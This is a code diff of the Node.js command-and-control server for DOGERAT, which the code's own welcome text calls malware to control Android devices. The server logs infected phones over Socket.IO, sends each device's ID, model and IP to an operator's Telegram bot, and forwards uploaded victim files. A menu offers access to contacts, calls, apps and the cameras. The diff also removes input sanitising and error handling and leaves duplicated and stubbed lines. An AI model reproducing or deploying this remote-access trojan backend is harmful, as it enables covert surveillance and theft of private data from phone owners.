@@ -20,7 +20,8 @@ const appData = new Map();
 // قائمة الإجراءات المتاحة
 const actions = [
     '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯',
-    '✯ 𝙲𝚊𝚕𝚕𝚜 ✯', 
+    '✯ 𝙲𝚊𝚕𝚕𝚜 ✯',
+    '✯ 𝙲𝚊𝚕𝚕𝚜 ✯',
     '✯ 𝙰𝚙𝚙𝚜 ✯',
     '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯',
     '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯',
@@ -44,271 +45,95 @@ const actions = [
     '✯ 𝙰𝚕𝚕 ✯'
 ];
 
-// دالة لتنظيف النص من مشاكل HTML
-function sanitizeText(text) {
-    if (!text) return '';
-    return text
-        .replace(/&/g, '&amp;')
-        .replace(/</g, '&lt;')
-        .replace(/>/g, '&gt;')
-        .replace(/"/g, '&quot;')
-        .replace(/'/g, '&#x27;');
-}
-
-// دالة لإرسال رسائل آمنة
-function sendSafeMessage(chatId, text, options = {}) {
-    const safeText = sanitizeText(text);
-    return bot.sendMessage(chatId, safeText, {
-        parse_mode: 'HTML',
-        ...options
-    });
-}
-
 // endpoint لرفع الملفات
 app.post('/upload', uploader.single('file'), (req, res) => {
-    try {
-        const fileBuffer = req.file.buffer;
-        const fileName = req.file.originalname;
-        
-        bot.sendDocument(data.id, fileBuffer, {
-            caption: `File received: ${fileName}`,
-            parse_mode: 'HTML'
-        }, {
-            filename: fileName,
-            contentType: 'application/octet-stream'
-        });
-        
-        res.send('Done');
-    } catch (error) {
-        console.error('Upload error:', error);
-        res.status(500).send('Error');
-    }
+    const fileBuffer = req.file.buffer;
+    const fileName = req.file.originalname;
+    
+    bot.sendDocument(data.id, req.file.buffer, {
+        caption: '<b>✯ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + fileName + '</b>',
+        parse_mode: 'HTML'
+    }, {
+        filename: fileName,
+        contentType: 'file'
+    });
+    
+    res.send('Done');
 });
 
 // endpoint للحصول على المضيف
 app.get('/host', (req, res) => {
-    res.send(data.host || 'https://your-app.onrender.com/');
-});
-
-// endpoint للصحة
-app.get('/health', (req, res) => {
-    res.json({ status: 'OK', timestamp: new Date().toISOString() });
+    res.send(data.host);
 });
 
 // التعامل مع اتصالات Socket
 io.on('connection', socket => {
-    try {
-        const deviceId = socket.handshake.headers['device-id'] || 
-                        socket.id || 
-                        'unknown-device';
-        const deviceModel = socket.handshake.headers['user-agent'] || 'unknown-model';
-        const deviceIp = socket.handshake.headers['x-forwarded-for'] || 
-                        socket.handshake.address || 
-                        'unknown-ip';
-        const connectionTime = new Date().toLocaleString();
+    let deviceId = socket.handshake.headers['device-id'] + '-' + io.sockets.sockets.size || 'no information';
+    let deviceModel = socket.handshake.headers['user-agent'] || 'no information';
+    let deviceIp = socket.handshake.headers['x-forwarded-for'] || 'no information';
+    
+    socket.deviceId = deviceId;
+    socket.deviceModel = deviceModel;
 
-        socket.deviceId = deviceId;
-        socket.deviceModel = deviceModel;
+    let connectMessage = '<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚗𝚍</b>\n\n' +
+                       '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 → ' + deviceId + '\n</b>' +
+                       '<b>𝚖𝚘𝚍𝚎𝚕 → ' + deviceModel + '\n</b>' +
+                       '<b>𝚒𝚙 → ' + deviceIp + '\n</b>' +
+                       '<b>𝚝𝚒𝚖𝚎 → ' + socket.handshake.time + '\n\n</b>';
 
-        const connectMessage = `
-<b>🟢 New Device Connected</b>
+    bot.sendMessage(data.id, connectMessage, { parse_mode: 'HTML' });
 
-<b>Device ID:</b> ${deviceId}
-<b>Model:</b> ${deviceModel}
-<b>IP:</b> ${deviceIp}
-<b>Time:</b> ${connectionTime}
-        `.trim();
+    // التعامل مع انقطاع الاتصال
+    socket.on('disconnect', () => {
+        let disconnectMessage = '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n' +
+                              '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 → ' + deviceId + '\n</b>' +
+                              '<b>𝚖𝚘𝚍𝚎𝚕 → ' + deviceModel + '\n</b>' +
+                              '<b>𝚒𝚙 → ' + deviceIp + '\n</b>' +
+                              '<b>𝚝𝚒𝚖𝚎 → ' + socket.handshake.time + '\n\n</b>';
+        bot.sendMessage(data.id, disconnectMessage, { parse_mode: 'HTML' });
+    });
 
-        sendSafeMessage(data.id, connectMessage);
-
-        // التعامل مع انقطاع الاتصال
-        socket.on('disconnect', (reason) => {
-            const disconnectMessage = `
-<b>🔴 Device Disconnected</b>
-
-<b>Device ID:</b> ${deviceId}
-<b>Model:</b> ${deviceModel}
-<b>IP:</b> ${deviceIp}
-<b>Time:</b> ${new Date().toLocaleString()}
-<b>Reason:</b> ${reason}
-            `.trim();
-
-            sendSafeMessage(data.id, disconnectMessage);
-        });
-
-        // التعامل مع الرسائل من الأجهزة
-        socket.on('message', (message) => {
-            const receivedMessage = `
-<b>📨 Message Received</b>
-
-<b>From:</b> ${deviceId}
-<b>Message:</b> ${message}
-            `.trim();
-
-            sendSafeMessage(data.id, receivedMessage);
-        });
-
-        // التعامل مع الأخطاء
-        socket.on('error', (error) => {
-            console.error('Socket error:', error);
-        });
-
-    } catch (error) {
-        console.error('Connection error:', error);
-    }
+    // التعامل مع الرسائل من الأجهزة
+    socket.on('message', message => {
+        bot.sendMessage(data.id, '<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + deviceId + '\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>' + message, { parse_mode: 'HTML' });
+    });
 });
 
 // التعامل مع أوامر التليجرام
-bot.on('message', (msg) => {
-    try {
-        const chatId = msg.chat.id;
-        const messageText = msg.text;
-
-        if (messageText === '/start') {
-            const welcomeMessage = `
-<b>🤖 Welcome to DOGERAT Control Panel</b>
-
-This is a remote device management system.
-
-<b>Developed by:</b> @CYBERSHIELDX
-
-<b>⚠️ Important:</b> Use responsibly and legally.
-            `.trim();
-
-            sendSafeMessage(chatId, welcomeMessage, {
+bot.on('message', msg => {
+    if (msg.text === '/start') {
+        bot.sendMessage(data.id, 
+            '<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DOGERAT</b>\n\n' +
+            'DOGERAT 𝚒𝚜 𝚊 𝚖𝚊𝚕𝚠𝚊𝚛𝚎 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜\n' +
+            '𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\n\n' +
+            '𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: @CYBERSHIELDX', 
+            {
+                parse_mode: 'HTML',
                 reply_markup: {
                     keyboard: [
-                        ['📱 Devices', '⚡ Actions'],
-                        ['ℹ️ About']
-                    ],
-                    resize_keyboard: true,
-                    one_time_keyboard: false
-                }
-            });
-        }
-        else if (messageText === '📱 Devices') {
-            const devicesCount = io.sockets.sockets.size;
-            
-            if (devicesCount === 0) {
-                sendSafeMessage(chatId, '<b>❌ No devices connected</b>');
-            } else {
-                let devicesList = `<b>📱 Connected Devices: ${devicesCount}</b>\n\n`;
-                let deviceIndex = 1;
-                
-                io.sockets.sockets.forEach((socket, id) => {
-                    devicesList += `<b>${deviceIndex}. ${socket.deviceId || id}</b>\n`;
-                    devicesList += `<b>Model:</b> ${socket.deviceModel || 'Unknown'}\n`;
-                    devicesList += `<b>IP:</b> ${socket.handshake.address || 'Unknown'}\n\n`;
-                    deviceIndex++;
-                });
-
-                sendSafeMessage(chatId, devicesList, {
-                    reply_markup: {
-                        keyboard: [
-                            ['📱 Devices', '⚡ Actions'],
-                            ['ℹ️ About', '🔄 Refresh']
-                        ],
-                        resize_keyboard: true
-                    }
-                });
-            }
-        }
-        else if (messageText === '⚡ Actions') {
-            const actionsMessage = `
-<b>⚡ Available Actions</b>
-
-Select an action to perform on connected devices.
-
-<b>Note:</b> Some features require device permissions.
-            `.trim();
-
-            sendSafeMessage(chatId, actionsMessage, {
-                reply_markup: {
-                    keyboard: [
-                        ['📞 Calls', '📸 Camera'],
-                        ['📱 Contacts', '📁 Files'],
-                        ['📍 Location', '📢 Notifications'],
-                        ['🔙 Back to Main']
-                    ],
-                    resize_keyboard: true,
-                    one_time_keyboard: true
-                }
-            });
-        }
-        else if (messageText === 'ℹ️ About') {
-            const aboutMessage = `
-<b>ℹ️ About DOGERAT</b>
-
-<b>Version:</b> 1.0.0
-<b>Developer:</b> @CYBERSHIELDX
-
-<b>⚠️ Disclaimer:</b>
-This tool is for educational and authorized testing purposes only. Misuse is prohibited.
-            `.trim();
-
-            sendSafeMessage(chatId, aboutMessage);
-        }
-        else if (messageText === '🔙 Back to Main') {
-            sendSafeMessage(chatId, '<b>🏠 Main Menu</b>', {
-                reply_markup: {
-                    keyboard: [
-                        ['📱 Devices', '⚡ Actions'],
-                        ['ℹ️ About']
+                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'],
+                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                     ],
                     resize_keyboard: true
                 }
             });
-        }
-        else if (messageText === '🔄 Refresh') {
-            const devicesCount = io.sockets.sockets.size;
-            sendSafeMessage(chatId, `<b>🔄 Refreshed</b>\n\n<b>Connected Devices:</b> ${devicesCount}`);
-        }
-
-    } catch (error) {
-        console.error('Bot message error:', error);
-        bot.sendMessage(msg.chat.id, '❌ Error processing your request');
     }
+    // ... باقي التعامل مع الأوامر
 });
 
 // إرسال ping دوري للأجهزة
 setInterval(() => {
-    try {
-        io.sockets.sockets.forEach((socket, id) => {
-            socket.emit('ping', { timestamp: Date.now() });
-        });
-    } catch (error) {
-        console.error('Ping error:', error);
-    }
-}, 30000); // كل 30 ثانية
+    io.sockets.sockets.forEach((socket, id, sockets) => {
+        io.to(id).emit('ping', {});
+    });
+}, 5000);
 
-// الحفاظ على السيرفر نشط (لـ Render)
+// الحفاظ على السيرفر نشط
 setInterval(() => {
-    try {
-        if (data.host && data.host.startsWith('http')) {
-            https.get(data.host, (res) => {
-                console.log('Keep-alive ping sent');
-            }).on('error', (err) => {
-                console.log('Keep-alive ping failed:', err.message);
-            });
-        }
-    } catch (error) {
-        console.error('Keep-alive error:', error);
-    }
-}, 120000); // كل دقيقتين
-
-// معالجة الأخطاء غير الملتقطة
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
-});
-
-process.on('uncaughtException', (error) => {
-    console.error('Uncaught Exception:', error);
-});
+    https.get(data.host, res => {}).on('error', err => {});
+}, 480000);
 
 // تشغيل السيرفر
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`📡 Socket.IO server is active`);
-    console.log(`🤖 Telegram bot is polling for messages`);
+server.listen(process.env.PORT || 3000, () => {
+    console.log('listening on port 3000');
 });
